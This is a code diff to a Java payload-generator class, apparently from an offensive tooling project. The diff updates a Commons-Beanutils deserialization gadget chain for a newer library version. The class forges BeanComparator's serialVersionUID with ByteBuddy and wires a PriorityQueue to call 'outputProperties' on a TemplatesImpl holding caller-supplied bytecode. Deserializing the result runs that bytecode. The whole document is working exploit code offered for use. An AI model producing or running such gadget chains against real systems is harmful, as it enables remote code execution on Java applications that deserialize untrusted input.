@@ -16,26 +16,28 @@ import java.net.URLClassLoader;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
+import static net.bytebuddy.matcher.ElementMatchers.named;
+
 /**
  * @author ReaJason
  * @since 2024/12/3
  */
-public class CommonsBeanutils19 implements Payload {
+public class CommonsBeanutils110 implements Payload {
     @Override
     @SneakyThrows
     public Object generate(byte[] bytes) {
         Object comparator = new ByteBuddy()
                 .redefine(BeanComparator.class)
-                .defineField("serialVersionUID", long.class, Visibility.PRIVATE, Ownership.STATIC, FieldManifestation.FINAL)
-                .value(-2044202215314119608L).make()
+                .field(named("serialVersionUID"))
+                .value(1L).make()
                 .load(new URLClassLoader(new URL[]{}), ClassLoadingStrategy.Default.INJECTION).getLoaded()
                 .getDeclaredConstructor(String.class, Comparator.class)
                 .newInstance(null, String.CASE_INSENSITIVE_ORDER);
         final PriorityQueue<Object> queue = new PriorityQueue<>(2, ((Comparator) comparator));
         queue.add("1");
         queue.add("1");
-        Reflections.setFieldValue(comparator, "property", "outputProperties");
         Object obj = TemplateUtils.createTemplatesImpl(bytes);
+        Reflections.setFieldValue(comparator, "property", "outputProperties");
         Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});
         return queue;
     }
